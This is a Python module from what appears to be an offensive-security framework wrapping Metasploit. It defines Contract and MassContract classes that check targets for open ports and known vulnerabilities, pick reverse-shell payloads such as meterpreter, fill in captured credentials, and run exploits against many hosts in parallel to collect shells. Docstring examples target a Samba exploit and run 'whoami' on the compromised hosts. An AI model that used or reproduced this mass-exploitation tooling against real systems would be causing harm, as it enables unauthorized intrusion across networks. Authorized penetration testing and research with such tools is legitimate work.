"""Contract module - orchestrates Target + Weapon + Bullet for a hit.

A Contract ties together all the pieces needed for an assassination:
the target, the weapon, and the bullet. It handles profiling,
validation, and execution.

Example:
    >>> target = Target("192.168.1.100")
    >>> weapon = hideout.arsenal.get("exploit/linux/samba/is_known_pipename")
    >>> contract = Contract(target, weapon)
    >>> contract.configure(SMB_SHARE_NAME="myshare")
    >>>
    >>> if contract.profile():
    ...     kill = contract.execute()
    ...     if kill:
    ...         print(kill.interrogate("whoami"))
"""

from __future__ import annotations

import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import TYPE_CHECKING, Any, Dict, List, Optional, Tuple, Union

import msf
from assassinate.config import get_config
from assassinate.console import print_contract, print_mass_contract
from assassinate.kill import Kill
from assassinate.log_config import get_logger
from assassinate.target import Target
from assassinate.weapon import Bullet, Weapon

if TYPE_CHECKING:
    pass

logger = get_logger("contract")


# Credential mapping registry - maps service type to (user_opt, pass_opt, domain_opt)
# Used by use_creds() to auto-fill weapon options from stored credentials
CRED_OPTION_MAP: Dict[str, Tuple[str, str, Optional[str]]] = {
    "smb": ("SMBUser", "SMBPass", "SMBDomain"),
    "ssh": ("USERNAME", "PASSWORD", None),
    "mysql": ("USERNAME", "PASSWORD", None),
    "postgres": ("USERNAME", "PASSWORD", None),
    "mssql": ("USERNAME", "PASSWORD", "DOMAIN"),
    "winrm": ("USERNAME", "PASSWORD", "DOMAIN"),
    "ftp": ("FTPUSER", "FTPPASS", None),
    "http": ("HttpUsername", "HttpPassword", None),
    "telnet": ("USERNAME", "PASSWORD", None),
    "vnc": ("PASSWORD", None, None),  # VNC often only has password
    "rdp": ("USERNAME", "PASSWORD", "DOMAIN"),
    "ldap": ("USERNAME", "PASSWORD", None),
    # Default fallback
    "default": ("USERNAME", "PASSWORD", "DOMAIN"),
}


class Contract:
    """A contract to assassinate a target.

    Orchestrates the Target, Weapon, and Bullet into a single operation.
    Handles configuration, profiling (pre-execution checks), and execution.

    Attributes:
        target: The Target to compromise
        weapon: The Weapon (exploit module) to use
        bullet: The Bullet (ammunition) to deliver

    Example:
        >>> contract = hideout.contract(
        ...     target="192.168.1.100",
        ...     weapon="exploit/linux/samba/is_known_pipename"
        ... )
        >>> contract.configure(SMB_SHARE_NAME="myshare")
        >>>
        >>> if contract.profile():
        ...     print("Target appears vulnerable!")
        ...     kill = contract.execute()
        ...     if kill:
        ...         print(kill.interrogate("id"))
    """

    __slots__ = (
        "target",
        "weapon",
        "bullet",
        "_profiled",
        "_profile_result",
        "_configured",
        "_executed",
    )

    def __init__(
        self,
        target: Union[Target, str],
        weapon: Union[Weapon, str],
        bullet: Optional[Union[Bullet, str]] = None,
    ):
        """Initialize a contract.

        Args:
            target: Target object or IP string
            weapon: Weapon object or module name
            bullet: Bullet object or name (auto-selected if not provided)
        """
        logger.debug("Creating contract")

        # Normalize target
        if isinstance(target, str):
            self.target = Target(target)
            logger.debug(f"Target created from string: {target}")
        else:
            self.target = target

        # Normalize weapon
        if isinstance(weapon, str):
            logger.debug(f"Creating weapon from module name: {weapon}")
            mod = msf.create_module(weapon)
            self.weapon = Weapon(mod)
        else:
            self.weapon = weapon

        # Normalize bullet (auto-select if not provided)
        if bullet is None:
            self.bullet = self._auto_select_bullet()
            logger.debug(f"Auto-selected bullet: {self.bullet.name}")
        elif isinstance(bullet, str):
            self.bullet = Bullet(bullet, self.weapon)
            logger.debug(f"Bullet created from string: {bullet}")
        else:
            self.bullet = bullet

        self._profiled = False
        self._profile_result: Optional[bool] = None
        self._configured = False
        self._executed = False

        logger.info(
            f"Contract created: {self.weapon.name} -> {self.target.host} with {self.bullet.name}"
        )

    def _auto_select_bullet(self) -> Bullet:
        """Auto-select the best bullet for this weapon.

        Priority:
        1. Meterpreter (most features)
        2. Staged shell
        3. Stageless shell
        4. Simple cmd bullets

        Returns:
            Best available Bullet
        """
        compatible = self.weapon.bullets()
        if not compatible:
            # Fallback to generic interact
            return Bullet("cmd/unix/interact", self.weapon)

        # Priority order - prefer meterpreter, then staged, then reverse
        preferences = [
            # Meterpreter (full featured)
            "meterpreter/reverse_tcp",
            "meterpreter_reverse_tcp",
            "meterpreter/reverse_https",
            # Staged shells
            "shell/reverse_tcp",
            "shell_reverse_tcp",
            # Reverse TCP
            "reverse_tcp",
            # Simple bullets
            "interact",
        ]

        for pref in preferences:
            for b in compatible:
                if pref in b.name.lower():
                    return b

        # Fallback: first compatible
        return compatible[0]

    # =========================================================================
    # Configuration
    # =========================================================================

    def configure(self, **options: Any) -> "Contract":
        """Configure weapon options.

        Automatically sets RHOSTS from target if not provided.
        For reverse payloads, auto-sets LHOST/LPORT from config if not provided.

        Args:
            **options: Option names and values

        Returns:
            self for method chaining

        Example:
            >>> contract.configure(
            ...     SMB_SHARE_NAME="myshare",
            ...     TARGET=0
            ... )
        """
        logger.debug(f"Configuring contract with {len(options)} options")
        config = get_config()

        # Auto-set RHOSTS from target
        if "RHOSTS" not in options:
            self.weapon.options.RHOSTS = self.target.host
            logger.debug(f"Auto-set RHOSTS to {self.target.host}")

        # Auto-set LHOST/LPORT for reverse payloads from config
        if self.bullet and self.bullet.connection == "reverse":
            if "LHOST" not in options and config.defaults.lhost:
                options["LHOST"] = config.defaults.lhost
                logger.debug(f"Auto-set LHOST to {config.defaults.lhost}")
            if "LPORT" not in options:
                options["LPORT"] = config.defaults.lport
                logger.debug(f"Auto-set LPORT to {config.defaults.lport}")

        # Apply provided options
        for key, value in options.items():
            self.weapon.options[key] = value
            logger.debug(f"Set option {key} = {value}")

        self._configured = True
        return self

    def set_bullet_option(self, key: str, value: Any) -> "Contract":
        """Set a bullet-specific option (e.g., LHOST, LPORT).

        Args:
            key: Option name (e.g., "LHOST", "LPORT")
            value: Option value

        Returns:
            self for method chaining
        """
        # Bullet options are set on the weapon module
        self.weapon.options[key] = value
        return self

    def use_creds(self, cred: Dict[str, Any]) -> "Contract":
        """Auto-fill weapon options from a stored credential.

        Uses CRED_OPTION_MAP to determine which weapon options
        correspond to username, password, and domain based on
        the weapon's service type.

        Args:
            cred: Credential dictionary with keys like 'user', 'pass', 'realm'
                  (typically from hideout.intel.creds())

        Returns:
            self for method chaining

        Example:
            >>> # Get credentials from Intel layer
            >>> ssh_creds = hideout.intel.creds(service="ssh")
            >>> if ssh_creds:
            ...     contract.use_creds(ssh_creds[0])
            ...     kill = contract.execute()

            >>> # Or from a custom source
            >>> contract.use_creds({
            ...     "user": "admin",
            ...     "pass": "password123",
            ...     "realm": "DOMAIN"
            ... })
        """
        # Determine service type from weapon
        service = self.weapon.service or "default"
        service_key = service.lower()

        # Get option mapping for this service
        mapping = CRED_OPTION_MAP.get(service_key, CRED_OPTION_MAP["default"])
        user_opt, pass_opt, domain_opt = mapping

        options_to_set: Dict[str, Any] = {}

        # Map credential fields to weapon options
        user = cred.get("user") or cred.get("username")
        if user and user_opt:
            options_to_set[user_opt] = user

        password = cred.get("pass") or cred.get("password")
        if password and pass_opt:
            options_to_set[pass_opt] = password

        domain = cred.get("realm") or cred.get("domain")
        if domain and domain_opt:
            options_to_set[domain_opt] = domain

        # Apply the options
        if options_to_set:
            logger.info(f"Auto-filling credentials for {service}: {list(options_to_set.keys())}")
            self.configure(**options_to_set)

        return self

    # =========================================================================
    # Pre-Execution
    # =========================================================================

    def profile(self, timeout: float | None = None) -> bool:
        """Profile the target to check if vulnerable.

        Performs pre-execution checks:
        1. Determine required port from weapon
        2. Check if port is open via socket connection
        3. Update target.ports if open
        4. Run MSF check() if weapon supports it

        Args:
            timeout: Socket connection timeout in seconds. Uses config default if None.

        Returns:
            True if target appears vulnerable, False otherwise

        Example:
            >>> if contract.profile():
            ...     print(f"Target vulnerable! Open ports: {contract.target.ports}")
            ...     kill = contract.execute()
        """
        if timeout is None:
            timeout = get_config().defaults.profile_timeout
        logger.info(f"Profiling target {self.target.host} for {self.weapon.name}")
        self._profiled = True

        # Ensure RHOSTS is set
        if not self._configured:
            self.configure()

        # Get required port
        port = self._get_required_port()
        logger.debug(f"Required port: {port}")

        if port is not None:
            # Check if port is open
            logger.debug(f"Checking if port {port} is open on {self.target.host}")
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((self.target.host, port))
                sock.close()

                if result != 0:
                    # Port closed
                    logger.info(f"Port {port} is closed on {self.target.host}")
                    self._profile_result = False
                    return False

                # Port is open, update target
                logger.debug(f"Port {port} is open on {self.target.host}")
                self.target.add_port(port, self.weapon.service)

            except (socket.error, OSError) as e:
                logger.warning(
                    f"Socket error checking port {port} on {self.target.host}: {e}"
                )
                self._profile_result = False
                return False

        # Run vulnerability check if available
        if self.weapon.has_check():
            logger.debug(f"Running vulnerability check on {self.target.host}")
            try:
                check_result = self.weapon.check()
                logger.debug(f"Check result: {check_result}")

                if "vulnerable" in check_result.lower():
                    logger.success(f"Target {self.target.host} is VULNERABLE")
                    self._profile_result = True
                    # Record vulnerability
                    for cve in self.weapon.cves:
                        self.target.add_vuln(cve)
                    return True
                elif "safe" in check_result.lower() or "not vulnerable" in check_result.lower():
                    logger.info(f"Target {self.target.host} is NOT vulnerable")
                    self._profile_result = False
                    return False
                # Unknown result, port was open, might still work
                logger.debug("Check result inconclusive, proceeding")
            except Exception as e:
                # Check failed, but port is open - might still work
                logger.warning(
                    f"Vulnerability check failed for {self.target.host}: {e} (proceeding anyway)"
                )

        # No check available or check was inconclusive, port is open
        # Mark target as profiled and assume vulnerable
        self.target.mark_profiled()
        self._profile_result = True
        logger.info(f"Profile complete for {self.target.host}: assuming vulnerable")
        return True

    def _get_required_port(self) -> Optional[int]:
        """Get the required port for this weapon.

        Returns:
            Port number or None if no port required
        """
        # Try RPORT option first
        port = self.weapon.port
        if port:
            return port

        # Try to get from weapon schema
        try:
            schema = self.weapon.options.schema()
            if "RPORT" in schema:
                default = schema["RPORT"].get("default")
                if default:
                    return int(default)
        except (ValueError, TypeError, KeyError):
            pass

        return None

    def validate(self) -> List[str]:
        """Check if contract is ready to execute.

        Returns:
            List of issues (empty if ready)

        Example:
            >>> issues = contract.validate()
            >>> if issues:
            ...     print("Not ready:")
            ...     for issue in issues:
            ...         print(f"  - {issue}")
        """
        issues = []

        # Check weapon validation
        if not self.weapon.validate():
            missing = self.weapon.missing_options()
            for opt in missing:
                issues.append(f"Required option not set: {opt}")

        # Check bullet compatibility
        if self.bullet:
            compatible = [b.name for b in self.weapon.bullets()]
            if self.bullet.name not in compatible:
                issues.append(f"Bullet {self.bullet.name} not compatible with {self.weapon.name}")

        return issues

    @property
    def ready(self) -> bool:
        """Is the contract ready to execute?"""
        return len(self.validate()) == 0

    # =========================================================================
    # Execution
    # =========================================================================

    def execute(self, timeout: int | None = None) -> Optional[Kill]:
        """Execute the hit.

        Runs the exploit with the loaded bullet and waits for
        a session to be established.

        Args:
            timeout: Seconds to wait for session. Uses config default if None.

        Returns:
            Kill on success, None on failure

        Example:
            >>> kill = contract.execute()
            >>> if kill:
            ...     print(f"Target eliminated: {kill}")
            ...     print(kill.interrogate("whoami"))
        """
        if timeout is None:
            timeout = get_config().defaults.timeout
        logger.info(
            f"Executing contract: {self.weapon.name} -> {self.target.host} with {self.bullet.name}"
        )

        # Ensure configured
        if not self._configured:
            self.configure()

        # Validate
        issues = self.validate()
        if issues:
            logger.error(f"Contract validation failed: {issues}")
            raise ValueError(f"Contract not ready: {', '.join(issues)}")

        self._executed = True

        # Execute the exploit
        try:
            logger.debug(f"Running exploit with timeout={timeout}")
            session = self.weapon._module.exploit(self.bullet.name, timeout)
            if session:
                logger.success(
                    f"Session {session.sid} established on {self.target.host}"
                )
                return Kill(
                    session,
                    target=self.target,
                    via_weapon=self.weapon.fullname,
                    via_payload=self.bullet.name,
                )
            else:
                logger.warning("No session obtained from exploit")
        except Exception as e:
            logger.error(f"Exploit execution failed: {e}", exc_info=True)

        return None

    # Themed aliases
    def assassinate(self, timeout: int | None = None) -> Optional[Kill]:
        """Alias for execute() - eliminate the target."""
        return self.execute(timeout)

    def hit(self, timeout: int | None = None) -> Optional[Kill]:
        """Alias for execute() - perform the hit."""
        return self.execute(timeout)

    # =========================================================================
    # Display
    # =========================================================================

    def summary(self) -> str:
        """Get a summary of this contract.

        Returns:
            Multi-line string with contract details
        """
        status = "ready" if self.ready else "not ready"
        if self._profiled:
            status = f"profiled:{self._profile_result}" if self._profile_result else "profiled:false"
        if self._executed:
            status = "executed"

        lines = [
            f"Contract: {self.weapon.name} -> {self.target.host}",
            f"  Status: {status}",
            f"  Weapon: {self.weapon.fullname}",
            f"  Bullet: {self.bullet.name}",
        ]

        issues = self.validate()
        if issues:
            lines.append("  Issues:")
            for issue in issues:
                lines.append(f"    - {issue}")

        return "\n".join(lines)

    def p(self, full: bool = False) -> None:
        """Print rich formatted summary.

        Args:
            full: Reserved for future use (consistency with other classes).
        """
        print_contract(
            weapon_name=self.weapon.fullname,
            target_host=self.target.host,
            bullet_name=self.bullet.name,
            ready=self.ready,
            profiled=self._profiled,
            profile_result=self._profile_result if self._profiled else None,
            executed=self._executed,
            kill_id=None,  # Contract doesn't track the resulting Kill
            full=full,
        )

    def __repr__(self) -> str:
        status = "ready" if self.ready else "not ready"
        parts = [f"<Contract {self.weapon.fullname} -> {self.target.host}"]
        parts.append(f"bullet={self.bullet.name}")
        parts.append(f"[{status}]")
        if self._profiled:
            profile_status = "vulnerable" if self._profile_result else "not vulnerable"
            parts.append(f"({profile_status})")
        return " ".join(parts) + ">"

    def __str__(self) -> str:
        return f"{self.weapon.name} -> {self.target.host}"


class MassContract:
    """A contract to assassinate multiple targets in parallel.

    Enables mass exploitation by running the same weapon against
    multiple targets concurrently.

    Attributes:
        targets: List of targets to attack
        weapon_name: Weapon to use (cloned for each target)
        bullet: Bullet to deliver
        kills: Successful kills
        failures: Failed attempts with error messages

    Example:
        >>> targets = ["192.168.1.100", "192.168.1.101", "192.168.1.102"]
        >>> mass = MassContract(
        ...     targets,
        ...     weapon="exploit/linux/samba/is_known_pipename",
        ...     max_parallel=5
        ... )
        >>> mass.configure(SMB_SHARE_NAME="myshare")
        >>>
        >>> # Profile all targets
        >>> vulnerable = mass.profile_all()
        >>> print(f"Vulnerable: {sum(vulnerable.values())}/{len(targets)}")
        >>>
        >>> # Execute the massacre
        >>> kills = mass.execute_all()
        >>> print(f"Success rate: {mass.success_rate:.1%}")
        >>> for kill in kills:
        ...     print(f"{kill.host}: {kill.interrogate('whoami')}")
    """

    __slots__ = (
        "targets",
        "_weapon_name",
        "bullet",
        "max_parallel",
        "_common_options",
        "_kills",
        "_failures",
        "_profile_results",
    )

    def __init__(
        self,
        targets: List[Union[Target, str]],
        weapon: Union[Weapon, str],
        bullet: Optional[Union[Bullet, str]] = None,
        max_parallel: int | None = None,
    ):
        """Initialize a mass contract.

        Args:
            targets: List of targets (Target objects or IP strings)
            weapon: Weapon to use (name or Weapon object)
            bullet: Bullet to use (auto-selected if not provided)
            max_parallel: Maximum concurrent operations. Uses config default if None.
        """
        if max_parallel is None:
            max_parallel = get_config().defaults.max_parallel
        logger.info(
            f"Creating mass contract for {len(targets)} targets with max_parallel={max_parallel}"
        )

        # Normalize targets
        self.targets = [
            Target(t) if isinstance(t, str) else t
            for t in targets
        ]

        # Store weapon name for cloning
        if isinstance(weapon, Weapon):
            self._weapon_name = weapon.fullname
        else:
            self._weapon_name = weapon

        logger.debug(f"Weapon: {self._weapon_name}")

        # Normalize bullet
        if isinstance(bullet, Bullet):
            self.bullet = bullet.name
        elif isinstance(bullet, str):
            self.bullet = bullet
        else:
            self.bullet = None  # Auto-select per target

        self.max_parallel = max_parallel
        self._common_options: Dict[str, Any] = {}
        self._kills: List[Kill] = []
        self._failures: List[Tuple[Target, str]] = []
        self._profile_results: Dict[Target, bool] = {}

    def configure(self, **options: Any) -> "MassContract":
        """Configure weapon options (applied to all targets).

        Args:
            **options: Option names and values

        Returns:
            self for method chaining
        """
        self._common_options.update(options)
        return self

    def _create_contract(self, target: Target) -> Contract:
        """Create a Contract for a single target."""
        contract = Contract(target, self._weapon_name, self.bullet)
        contract.configure(**self._common_options)
        return contract

    # =========================================================================
    # Mass Profiling
    # =========================================================================

    def profile_all(self, parallel: bool = True) -> Dict[Target, bool]:
        """Profile all targets.

        Args:
            parallel: Run profiling in parallel

        Returns:
            Dict mapping target to vulnerability status

        Example:
            >>> results = mass.profile_all()
            >>> vulnerable = [t for t, v in results.items() if v]
            >>> print(f"{len(vulnerable)} targets vulnerable")
        """
        logger.info(
            f"Profiling {len(self.targets)} targets (parallel={parallel}, workers={self.max_parallel})"
        )
        self._profile_results = {}

        def profile_target(target: Target) -> Tuple[Target, bool]:
            try:
                contract = self._create_contract(target)
                result = contract.profile()
                logger.debug(f"Profile {target.host}: {result}")
                return (target, result)
            except Exception as e:
                logger.warning(f"Profile failed for {target.host}: {e}")
                return (target, False)

        if parallel:
            with ThreadPoolExecutor(max_workers=self.max_parallel) as executor:
                futures = {
                    executor.submit(profile_target, t): t
                    for t in self.targets
                }
                for future in as_completed(futures):
                    target, result = future.result()
                    self._profile_results[target] = result
        else:
            for target in self.targets:
                _, result = profile_target(target)
                self._profile_results[target] = result

        vulnerable_count = sum(1 for v in self._profile_results.values() if v)
        logger.info(
            f"Profile complete: {vulnerable_count}/{len(self.targets)} targets vulnerable"
        )
        return self._profile_results.copy()

    # =========================================================================
    # Mass Execution
    # =========================================================================

    def execute_all(
        self,
        timeout: int | None = None,
        stop_on_success: Optional[int] = None,
        profile_first: bool = True,
    ) -> List[Kill]:
        """Execute hits on all targets in parallel.

        Args:
            timeout: Seconds to wait for each session. Uses config default if None.
            stop_on_success: Stop after N successful kills (None for all)
            profile_first: Profile targets before attempting exploit

        Returns:
            List of successful Kills

        Example:
            >>> kills = mass.execute_all(timeout=60)
            >>> print(f"Got {len(kills)} shells")
            >>> for kill in kills:
            ...     print(f"  {kill.host}: {kill.interrogate('id')}")
        """
        if timeout is None:
            timeout = get_config().defaults.timeout
        logger.info(
            f"Executing mass contract: {len(self.targets)} targets (timeout={timeout}, stop_on_success={stop_on_success})"
        )
        self._kills = []
        self._failures = []

        # Determine which targets to attempt
        targets_to_attack = self.targets
        if profile_first and not self._profile_results:
            self.profile_all()
            targets_to_attack = [t for t, v in self._profile_results.items() if v]
            logger.info(f"Attacking {len(targets_to_attack)} vulnerable targets")

        def attack_target(target: Target) -> Tuple[Target, Optional[Kill], Optional[str]]:
            try:
                logger.debug(f"Attacking target: {target.host}")
                contract = self._create_contract(target)
                kill = contract.execute(timeout)
                if kill:
                    logger.success(f"Kill confirmed: {target.host}")
                    return (target, kill, None)
                else:
                    logger.debug(f"No session from {target.host}")
                    return (target, None, "No session established")
            except Exception as e:
                logger.warning(f"Attack failed on {target.host}: {e}")
                return (target, None, str(e))

        # Execute in parallel
        success_count = 0
        with ThreadPoolExecutor(max_workers=self.max_parallel) as executor:
            futures = {
                executor.submit(attack_target, t): t
                for t in targets_to_attack
            }

            for future in as_completed(futures):
                target, kill, error = future.result()

                if kill:
                    self._kills.append(kill)
                    success_count += 1
                    if stop_on_success and success_count >= stop_on_success:
                        logger.info(
                            f"Reached stop_on_success limit ({stop_on_success}), cancelling remaining"
                        )
                        # Cancel remaining futures
                        for f in futures:
                            f.cancel()
                        break
                else:
                    self._failures.append((target, error or "Unknown error"))

        logger.info(
            f"Mass execution complete: {len(self._kills)} kills, {len(self._failures)} failures ({self.success_rate * 100:.1f}% success)"
        )
        return self._kills

    # Themed alias
    def massacre(self, **kwargs) -> List[Kill]:
        """Alias for execute_all() - mass assassination."""
        return self.execute_all(**kwargs)

    # =========================================================================
    # Results
    # =========================================================================

    @property
    def kills(self) -> List[Kill]:
        """All successful kills."""
        return self._kills.copy()

    @property
    def failures(self) -> List[Tuple[Target, str]]:
        """Failed attempts with error messages."""
        return self._failures.copy()

    @property
    def success_rate(self) -> float:
        """Percentage of successful hits."""
        total = len(self._kills) + len(self._failures)
        if total == 0:
            return 0.0
        return len(self._kills) / total

    @property
    def attempted(self) -> int:
        """Total number of attempted attacks."""
        return len(self._kills) + len(self._failures)

    # =========================================================================
    # Display
    # =========================================================================

    def summary(self, full: bool = False) -> str:
        """Get a summary of mass operation results.

        Args:
            full: If True, show all kills and failures without truncation.

        Returns:
            Multi-line string with results
        """
        lines = [
            f"MassContract: {self._weapon_name}",
            f"  Targets: {len(self.targets)}",
            f"  Attempted: {self.attempted}",
            f"  Kills: {len(self._kills)}",
            f"  Failures: {len(self._failures)}",
            f"  Success Rate: {self.success_rate:.1%}",
        ]

        if self._kills:
            lines.append("  Confirmed Kills:")
            kill_limit = None if full else 5
            for kill in self._kills[:kill_limit]:
                lines.append(f"    - {kill.host}:{kill.port}")
            if not full and len(self._kills) > 5:
                lines.append(f"    ... and {len(self._kills) - 5} more")

        if self._failures:
            lines.append("  Failures:")
            fail_limit = None if full else 5
            for target, error in self._failures[:fail_limit]:
                lines.append(f"    - {target.host}: {error}")
            if not full and len(self._failures) > 5:
                lines.append(f"    ... and {len(self._failures) - 5} more")

        return "\n".join(lines)

    def p(self, full: bool = False) -> None:
        """Print rich formatted summary.

        Args:
            full: If True, show all kills and failures without truncation.
        """
        # Build kills list as (host, port) tuples
        kills_list = [(k.host, k.port) for k in self._kills]

        # Build failures list as (host, error) tuples
        failures_list = [(t.host, e) for t, e in self._failures]

        # Get target hosts
        target_hosts = [t.host for t in self.targets]

        print_mass_contract(
            weapon_name=self._weapon_name,
            targets=target_hosts,
            bullet_name=self.bullet,
            kills=kills_list,
            failures=failures_list,
            attempted=self.attempted,
            full=full,
        )

    def __repr__(self) -> str:
        parts = [f"<MassContract {self._weapon_name} -> {len(self.targets)} targets"]
        if self.bullet:
            parts.append(f"bullet={self.bullet}")
        if self.attempted > 0:
            parts.append(f"[{len(self._kills)} kills, {len(self._failures)} failed, {self.success_rate:.0%}]")
        else:
            parts.append(f"[not executed]")
        return " ".join(parts) + ">"

    def __str__(self) -> str:
        return f"{self._weapon_name} -> {len(self.targets)} targets"
